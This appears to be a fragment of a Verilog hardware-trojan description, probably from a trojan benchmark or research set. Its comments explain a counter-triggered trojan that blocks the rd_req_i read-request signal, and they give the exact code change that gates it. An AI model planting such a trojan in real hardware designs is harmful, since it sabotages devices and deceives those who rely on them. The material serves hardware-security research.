 ...
 * 
 * Description:
 *   Disables operations by blocking rd_req_i control signal
 *   
 * Trigger: Counter on rd_req_i
 * Payload: Block rd_req_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block rd_req_i when trojan is active
//
// IMPORTANT: rd_req_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (rd_req_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: rd_req_i && 0 = 0 (always false)
//   All operations controlled by rd_req_i are blocked
